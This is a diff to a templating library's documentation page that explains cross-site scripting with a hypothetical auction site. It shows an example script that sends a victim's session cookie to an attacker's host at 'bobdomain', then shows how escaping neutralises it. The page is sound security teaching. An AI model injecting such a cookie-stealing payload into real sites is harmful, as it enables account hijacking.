@@ -1,14 +1,19 @@
 
+
+<p> Skip this section if you already what an XSS vulnerability is. </p>
+
+<h1> What is an XSS vulnerability? </h1>
+
 <p> Cubictemp includes built-in protection against a very common but
 much-neglected class of software security problems - cross-site scripting
 vulnerabilities (commonly referred to as XSS vulnerabilities). First, a quick
 definition: in the context of web-based applications, an XSS vulnerability
 occurs when input provided by the user is embedded verbatim in an HTML page
-without first being escaped.  At first sight, this may appear to be a
-relatively benign circumstance, but the reality is that XSS vulnerabilities can
-cause serious security problems. Since we think that it is important that every
-web developer fully understands the causes and effects of XSS problems, we will
-work through a fairly detailed example of the problem below.  </p>
+without first being escaped. At first sight, this may appear to be a relatively
+benign circumstance, but the reality is that XSS vulnerabilities can cause
+serious security problems. Since we think that it is important that every web
+developer fully understands the causes and effects of XSS problems, we will
+work through a simple example of the problem below.  </p>
 
 <p> To make our XSS example concrete, let's pretend that we are evaluating the
 security of CubeTrader, a hypothetical Ebay-like auctioning application.
@@ -35,9 +40,9 @@ when after Bob has set the malicious title: </p>
 
 <!--(block|htmlSyntax)-->
 <h1>
-	<script>
-		document.location='http://bobdomain/cookie.cgi?' + document.cookie
-	</script> 
+    <script>
+        document.location='http://bobdomain/cookie.cgi?' + document.cookie
+    </script> 
 </h1>
 <!--(end)-->
 
@@ -49,7 +54,7 @@ authenticated), and allow him access to Alice's account.</p>
 
 <p> The authentication and session tracking mechanism described above is used,
 with minor variations, by the majority of web applications out there. Our
-example is slightly contrived, and glosses over many aspects that would
+example is slightly contrived, and glosses over some aspects that would
 complicate matters for Bob in real life. In essence, however, the example above
 is complete. Note, also, that this is only one example of an XSS exploit. The
 complex intersection between web application vulnerabilities, browser
@@ -79,6 +84,5 @@ like this: </p>
 
 <p> The special HTML characters have been converted to their HTML escaped
 equivalents. Instead of interpreting the script above as Javascript, the
-browser will simply display Bob's title inline, angle brackets and all. </p>
-
-
+browser will harmlessly display Bob's title inline, angle brackets and all.
+</p>
